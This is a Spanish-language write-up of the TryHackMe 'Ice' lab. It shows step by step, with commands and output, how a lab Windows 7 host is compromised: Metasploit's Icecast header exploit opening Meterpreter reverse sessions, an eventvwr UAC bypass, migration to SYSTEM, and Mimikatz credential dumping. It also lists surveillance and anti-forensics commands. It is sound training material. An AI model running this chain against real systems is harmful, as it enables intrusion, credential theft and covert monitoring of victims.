---
title: "TryHackMe: Ice"
category: "TryHackMe"
order: 22
tags: ["tryhackme", "icecast", "metasploit", "meterpreter", "mimikatz", "windows"]
layout: layouts/writeup.njk
permalink: /writeups/thm-ice.html
---

## Reconocimiento

```bash
nmap -Pn -n -v 10.10.112.210 -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV
...
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0
8000/tcp  open  http           Icecast streaming media server
49152-49166/tcp open msrpc
```

**Servicio en el puerto 8000:** Icecast. **Hostname:** `DARK-PC`.

## Explotación con Metasploit

Icecast en esta versión tiene una vulnerabilidad conocida (**CVE-2004-1561**, header overwrite):

```bash
msf6 > search icecast
0  exploit/windows/http/icecast_header  2004-09-28  great  No  Icecast Header Overwrite

msf6 exploit(windows/http/icecast_header) > set lhost 10.21.33.55
msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.112.210
msf6 exploit(windows/http/icecast_header) > exploit

[*] Meterpreter session 1 opened
```

**Usuario que corría Icecast:** `Dark` — **Build de Windows:** `7601` (Windows 7 SP1) — **Arquitectura del proceso:** `x64`.

## Escalada de privilegios (UAC bypass)

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
...
exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
```

```bash
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 2
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 192.168.1.118
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Meterpreter session 3 opened
```

`getprivs` confirma privilegios ampliados, incluyendo `SeTakeOwnershipPrivilege`.

## Migración a proceso SYSTEM y volcado de credenciales

Para interactuar con `lsass` se necesita vivir en un proceso de la misma arquitectura (x64) y mismos privilegios — el servicio de impresión (`spoolsv.exe`) cumple ambos requisitos y se reinicia solo si se cae:

```bash
meterpreter > migrate -N spoolsv.exe
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Con Kiwi (Mimikatz para Meterpreter) se extraen las credenciales en memoria:

```bash
meterpreter > load kiwi
meterpreter > creds_all
...
wdigest credentials
Username  Domain     Password
Dark      Dark-PC    Password01!
```

**Contraseña de Dark:** `Password01!` — extraída de memoria gracias a una tarea programada que ejecuta Icecast como ese usuario (Windows Defender y el firewall estaban deshabilitados).

## Comandos de post-explotación relevantes

- `hashdump` — vuelca el SAM local.
- `screenshare` — observa el escritorio remoto en tiempo real.
- `record_mic` — graba audio del micrófono del sistema.
- `timestomp` — manipula atributos MACE de archivos (no usar sin autorización explícita, dificulta el análisis forense del equipo defensor).
- `golden_ticket_create` — crea un golden ticket Kerberos para persistencia en el dominio.

## Lecciones aprendidas

- Servicios de streaming olvidados (Icecast) con versiones antiguas siguen siendo vectores de RCE completamente funcionales años después de publicado el CVE.
- El bypass de UAC vía `eventvwr.exe` es efectivo contra la configuración por defecto en Windows 7/8/10 cuando el usuario ya pertenece al grupo Administradores.
- Migrar a un proceso del mismo bitness y privilegios que `lsass` (como `spoolsv.exe`) es clave antes de intentar volcar credenciales con Kiwi/Mimikatz.
